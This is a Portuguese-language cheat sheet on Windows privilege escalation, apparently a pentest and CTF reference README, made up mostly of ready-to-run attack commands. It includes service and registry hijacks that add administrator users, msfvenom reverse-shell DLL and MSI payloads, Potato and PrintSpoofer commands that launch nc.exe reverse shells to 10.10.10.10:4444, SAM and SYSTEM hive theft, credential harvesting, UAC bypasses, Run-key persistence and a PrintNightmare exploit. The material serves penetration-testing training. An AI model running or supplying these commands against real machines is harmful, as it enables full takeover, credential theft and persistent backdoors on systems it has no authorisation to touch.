# 🪟 Escalada de privilégios em Windows — guia de referência completo

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

> **Notas de versão e contexto:** WMIC é uma ferramenta antiga, descontinuada e ausente de versões recentes do Windows; `Get-WmiObject` pertence ao Windows PowerShell e foi removido do PowerShell 7. `Get-ModifiableService` é uma função do PowerUp, não um comando integrado. [WMIC — Microsoft](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmic), [diferenças do PowerShell](https://learn.microsoft.com/en-us/powershell/scripting/whats-new/differences-from-windows-powershell) e [PowerUp original](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1). Os blocos misturam por vezes comandos de CMD, PowerShell e exemplos C; as linhas iniciadas por # são comentários explicativos do guia, não sintaxe de comentário de CMD. Um token é o objeto que descreve a identidade e os privilégios de um processo; DLL é uma biblioteca de ligação dinâmica.

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗    ██╗██╗███╗   ██╗██████╗  ██████╗ ██╗    ██╗███████╗
  ██║    ██║██║████╗  ██║██╔══██╗██╔═══██╗██║    ██║██╔════╝
  ██║ █╗ ██║██║██╔██╗ ██║██║  ██║██║   ██║██║ █╗ ██║███████╗
  ██║███╗██║██║██║╚██╗██║██║  ██║██║   ██║██║███╗██║╚════██║
  ╚███╔███╔╝██║██║ ╚████║██████╔╝╚██████╔╝╚███╔███╔╝███████║
   ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚══════╝
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/Windows-PrivEsc-blue?style=for-the-badge" alt="Windows PrivEsc">
  <img src="https://img.shields.io/badge/Post-Exploitation-orange?style=for-the-badge" alt="Post Exploitation">
  <img src="https://img.shields.io/badge/SYSTEM-Access-red?style=for-the-badge" alt="SYSTEM">
  <img src="https://img.shields.io/badge/CTF-Ready-green?style=for-the-badge" alt="CTF">
</p>

<p align="center">
  <b>🔓 Guia completo de escalada de privilégios em sistemas Windows</b>
</p>

---

## 📋 Índice

- [Enumeração](#-enumeration)
- [Exploração de serviços](#-service-exploitation)
- [Caminhos de serviços sem aspas](#-unquoted-service-paths)
- [Apropriação do carregamento de DLL (DLL hijacking)](#-dll-hijacking)
- [AlwaysInstallElevated](#-alwaysinstallelevated)
- [Credenciais guardadas](#-stored-credentials)
- [Manipulação de tokens](#-token-manipulation)
- [Ataques da família Potato](#-potato-attacks)
- [Exploração de configurações do registo](#-registry-exploits)
- [Tarefas agendadas](#-scheduled-tasks)
- [Contornar UAC](#-uac-bypass)
- [Exploração de vulnerabilidades do kernel](#-kernel-exploits)
- [Referência rápida](#-quick-reference)

---

<a id="-enumeration"></a>
## 🔍 Enumeração

### Informações do sistema

```cmd
# Informações do sistema
systeminfo
hostname

# Versão do sistema operativo
ver
wmic os get caption,version,buildnumber

# Arquitetura
echo %PROCESSOR_ARCHITECTURE%

# Atualizações e correções (patches/hotfixes)
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Informações dos utilizadores

```cmd
# Utilizador atual
whoami
whoami /all
whoami /priv
whoami /groups

# Todos os utilizadores
net user
net localgroup administrators

# Detalhes do utilizador
net user username

# Privilégios atuais
whoami /priv
```

### Informações da rede

```cmd
# Configuração IP
ipconfig /all

# Rotas
route print

# Portas abertas
netstat -ano
netstat -an | findstr LISTENING

# Tabela ARP
arp -a

# Cache DNS
ipconfig /displaydns
```

### Processos e serviços

```cmd
# Processos em execução
tasklist
tasklist /svc
wmic process list full

# Serviços
sc query
net start
wmic service list brief

# Controladores (drivers)
driverquery
```

### Enumeração com PowerShell

```powershell
# Informações do sistema
Get-ComputerInfo

# Utilizadores
Get-LocalUser
Get-LocalGroupMember Administrators

# Serviços
Get-Service

# Processos
Get-Process

# Software instalado
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, Publisher, InstallDate
```

---

<a id="-service-exploitation"></a>
## ⚙️ Exploração de serviços

### Encontrar serviços vulneráveis

```cmd
# Listar serviços
sc query state= all

# Permissões dos serviços
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Users" *

# Verificar um serviço específico
sc qc servicename
```

### Permissões de serviço insuficientemente restritas

```cmd
# Se conseguir alterar a configuração do serviço:
sc config servicename binpath= "C:\Users\Public\shell.exe"
sc config servicename binpath= "net localgroup administrators user /add"
sc stop servicename
sc start servicename
```

### Permissões insuficientemente restritas no executável do serviço

```cmd
# Verificar as permissões do executável
icacls "C:\Program Files\Service\binary.exe"

# Se tiver permissão de escrita, substituir por um executável malicioso
copy shell.exe "C:\Program Files\Service\binary.exe"
sc stop servicename
sc start servicename
```

### Verificação de serviços com PowerShell

```powershell
# Obter informações dos serviços
Get-WmiObject win32_service | Select-Object Name, StartName, PathName

# Encontrar serviços que possam ser alterados
Get-ModifiableService
```

---

<a id="-unquoted-service-paths"></a>
## 📂 Caminhos de serviços sem aspas

### Encontrar caminhos sem aspas

```cmd
# Encontrar caminhos de serviços sem aspas
wmic service get name,pathname,displayname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# PowerShell
Get-WmiObject win32_service | Select-Object Name,PathName | Where-Object {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'}
```

### Explorar um caminho sem aspas

```
# Se o caminho for: C:\Program Files\Vulnerable Service\service.exe
# O Windows procura:
# 1. C:\Program.exe
# 2. C:\Program Files\Vulnerable.exe
# 3. C:\Program Files\Vulnerable Service\service.exe

# Colocar o executável malicioso:
copy shell.exe "C:\Program Files\Vulnerable.exe"

# Reiniciar o serviço
sc stop "Vulnerable Service"
sc start "Vulnerable Service"
```

---

<a id="-dll-hijacking"></a>
## 📚 Apropriação do carregamento de DLL (DLL hijacking)

### Encontrar DLLs em falta

> **Precisão:** a lista seguinte simplifica a ordem de pesquisa de DLLs; esta varia com o tipo de aplicação, o modo de pesquisa e outros mecanismos do Windows. [Ordem oficial de pesquisa](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order).

```cmd
# Utilizar o Process Monitor para encontrar DLLs em falta
# Filtro: Result = NAME NOT FOUND, Path termina em .dll

# Locais comuns pesquisados:
# 1. Diretório da aplicação
# 2. C:\Windows\System32
# 3. C:\Windows
# 4. Diretório atual
# 5. Diretórios de PATH
```

### Criar uma DLL maliciosa

```c
// Payload do msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll -o evil.dll

// Ou compilar uma DLL personalizada:
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c net localgroup administrators user /add");
    }
    return TRUE;
}
```

### Explorar

```cmd
# Copiar a DLL para um diretório do caminho de pesquisa com permissão de escrita
copy evil.dll "C:\Program Files\App\missing.dll"

# Levar a aplicação a carregar a DLL
# Reiniciar o serviço ou a aplicação
```

---

<a id="-alwaysinstallelevated"></a>
## 📦 AlwaysInstallElevated

### Verificar a existência da vulnerabilidade

```cmd
# Ambos os valores têm de estar definidos como 1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Explorar

```bash
# Gerar um MSI malicioso
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o evil.msi

# Transferir e executar
msiexec /quiet /qn /i evil.msi
```

---

<a id="-stored-credentials"></a>
## 🔑 Credenciais guardadas

### Gestor de Credenciais

```cmd
# Listar as credenciais guardadas
cmdkey /list

# Utilizar as credenciais guardadas
runas /savecred /user:Administrator cmd.exe
```

### SAM & SYSTEM

```cmd
# Copiar os ficheiros SAM (exige SYSTEM)
copy C:\Windows\System32\config\SAM C:\Users\Public\SAM
copy C:\Windows\System32\config\SYSTEM C:\Users\Public\SYSTEM

# A partir de cópias sombra
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .
```

### Credenciais no registo

```cmd
# Palavras-passe de início de sessão automático
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# Palavras-passe VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Sessões PuTTY
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

### Ficheiros com palavras-passe

```cmd
# Procurar palavras-passe
findstr /si password *.txt *.xml *.ini *.config
findstr /spin "password" *.*

# Ficheiros de instalação não assistida (Unattend)
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\System32\sysprep.inf
C:\Windows\System32\sysprep\sysprep.xml

# Histórico do PowerShell
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Configuração do IIS
type C:\inetpub\wwwroot\web.config
```

### Palavras-passe Wi-Fi

```cmd
# Listar os perfis
netsh wlan show profiles

# Obter a palavra-passe
netsh wlan show profile name="SSID" key=clear
```

---

<a id="-token-manipulation"></a>
## 🎭 Manipulação de tokens

### Verificar os privilégios

```cmd
whoami /priv

# Privilégios perigosos:
# SeImpersonatePrivilege
# SeAssignPrimaryTokenPrivilege
# SeTcbPrivilege
# SeBackupPrivilege
# SeRestorePrivilege
# SeCreateTokenPrivilege
# SeLoadDriverPrivilege
# SeTakeOwnershipPrivilege
# SeDebugPrivilege
```

### SeImpersonatePrivilege

```cmd
# Se SeImpersonatePrivilege estiver ativado:
# Utilizar ataques Potato e técnicas relacionadas (JuicyPotato, PrintSpoofer, etc.)

# PrintSpoofer
PrintSpoofer.exe -i -c "cmd"
PrintSpoofer.exe -c "C:\Users\Public\nc.exe 10.10.10.10 4444 -e cmd"

# GodPotato
GodPotato.exe -cmd "cmd /c whoami"
```

### SeBackupPrivilege

```cmd
# Pode ler qualquer ficheiro
# Copiar SAM e SYSTEM
robocopy /b C:\Windows\System32\config C:\Users\Public SAM SYSTEM
```

### SeRestorePrivilege

```cmd
# Pode escrever em qualquer localização
# Substituir ficheiros do sistema
```

---

<a id="-potato-attacks"></a>
## 🥔 Ataques da família Potato

### JuicyPotato (Windows Server 2016/2019)

> **Compatibilidade:** a referência a Server 2019 no título original não garante suporte do JuicyPotato clássico. Estes ataques dependem da versão do sistema, dos serviços disponíveis e dos privilégios presentes no token; não decorrem apenas do nome do Windows. [Projeto original](https://github.com/ohpe/juicy-potato).

```cmd
# Exige SeImpersonatePrivilege ou SeAssignPrimaryToken
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net localgroup administrators user /add" -t *
```

### PrintSpoofer (Windows 10/Server 2016+)

```cmd
# Exige SeImpersonatePrivilege
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "nc.exe 10.10.10.10 4444 -e cmd"
```

### RoguePotato

```cmd
RoguePotato.exe -r 10.10.10.10 -e "cmd /c whoami > C:\Users\Public\out.txt" -l 9999
```

### GodPotato (Windows 10/11/Server 2019-2022)

```cmd
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 10.10.10.10 4444"
```

---

<a id="-registry-exploits"></a>
## 📝 Exploração de configurações do registo

### AutoRuns

```cmd
# Verificar os locais de arranque automático
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Se tiver permissão de escrita, adicionar uma entrada maliciosa
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\Users\Public\shell.exe"
```

### Chaves de registo dos serviços

```cmd
# Verificar as permissões de registo dos serviços
accesschk.exe -kvuqws "Everyone" HKLM\System\CurrentControlSet\Services

# Alterar ImagePath do serviço
reg add "HKLM\SYSTEM\CurrentControlSet\Services\vulnerable" /v ImagePath /t REG_EXPAND_SZ /d "C:\Users\Public\shell.exe" /f
```

---

<a id="-scheduled-tasks"></a>
## ⏰ Tarefas agendadas

### Listar as tarefas agendadas

```cmd
schtasks /query /fo LIST /v
schtasks /query /fo TABLE

# PowerShell
Get-ScheduledTask | Select-Object TaskName, TaskPath, State
```

### Encontrar scripts de tarefas com permissão de escrita

```cmd
# Se a tarefa executar um script que possa alterar:
icacls "C:\Scripts\backup.bat"

# Adicionar um comando malicioso
echo net localgroup administrators user /add >> C:\Scripts\backup.bat
```

### Criar uma tarefa maliciosa

```cmd
# Se tiver permissão para criar tarefas
schtasks /create /tn "Evil" /tr "C:\Users\Public\shell.exe" /sc onlogon /ru SYSTEM
```

---

<a id="-uac-bypass"></a>
## 🛡️ Contornar UAC

### Verificar o nível de UAC

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
```

### Contorno através de Fodhelper

```cmd
# Funciona em Windows 10
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
fodhelper.exe

# Limpar as alterações
reg delete HKCU\Software\Classes\ms-settings /f
```

### Contorno através do Visualizador de Eventos

```cmd
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
eventvwr.exe
```

---

<a id="-kernel-exploits"></a>
## 💣 Exploração de vulnerabilidades do kernel

### Verificar as informações do sistema

```cmd
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Vulnerabilidades comuns exploráveis

> **Precisão:** esta tabela agrupa vulnerabilidades de componentes diferentes, incluindo serviços de rede e de impressão; não são todas falhas do kernel. «Todas» não significa que qualquer instalação atual seja vulnerável. Verificar a versão, as atualizações e a exposição do componente é essencial; a presença do serviço Spooler, por si só, não prova PrintNightmare.

| CVE | Versão do Windows | Nome |
|-----|-----------------|------|
| MS08-067 | XP/2003 | NetAPI |
| MS16-032 | 7/8/10/2012 | Secondary Logon |
| MS17-010 | Todas | **EternalBlue** |
| CVE-2020-0796 | 10/Server 2019 | **SMBGhost** |
| CVE-2021-1732 | 10/Server | Win32k |
| CVE-2021-34527 | Todas | **PrintNightmare** |

### PrintNightmare (CVE-2021-34527)

```cmd
# Verificar se é vulnerável
Get-Service Spooler

# Exploração (PowerShell)
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "password123!" -DriverName "Xerox"
```

---

<a id="-quick-reference"></a>
## 📊 Referência rápida

### Enumeração com comandos de uma linha

```cmd
# Informações rápidas
whoami /all & systeminfo & net user

# Verificar privilégios
whoami /priv

# Serviços
wmic service get name,pathname | findstr /i /v "c:\windows"

# Tarefas agendadas
schtasks /query /fo LIST /v | findstr /i "taskname\|run"
```

### Ferramentas de automatização

| Ferramenta | Descrição |
|------|-------------|
| **WinPEAS** | Enumeração abrangente |
| **PowerUp** | Escalada de privilégios com PowerShell |
| **Seatbelt** | Verificações de segurança |
| **SharpUp** | Verificações de escalada de privilégios em C# |

### Lista de verificação de oportunidades imediatas

- [ ] `whoami /priv` — Verificar SeImpersonate
- [ ] Caminhos de serviços sem aspas
- [ ] Executáveis de serviços com permissão de escrita
- [ ] AlwaysInstallElevated
- [ ] Credenciais guardadas (cmdkey /list)
- [ ] Palavras-passe de início de sessão automático no registo
- [ ] Permissões de serviço insuficientemente restritas
- [ ] Scripts de tarefas agendadas
- [ ] Versão do kernel — PrintNightmare?

---

## 📚 Recursos

- [LOLBAS](https://lolbas-project.github.io/)
- [HackTricks Windows PrivEsc](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

### Guias de referência relacionados
- WinPEAS — o guia local referido no original não está incluído nesta cópia; consulte o [projeto oficial PEASS-ng](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS).
- [Escalada de privilégios em Linux](../../Linux-PrivEsc/translations/README.pt.md)

---

<p align="center">
  <b>🪟 Obtenha acesso SYSTEM!</b><br>
  <i>Domine a escalada de privilégios em Windows</i>
</p>
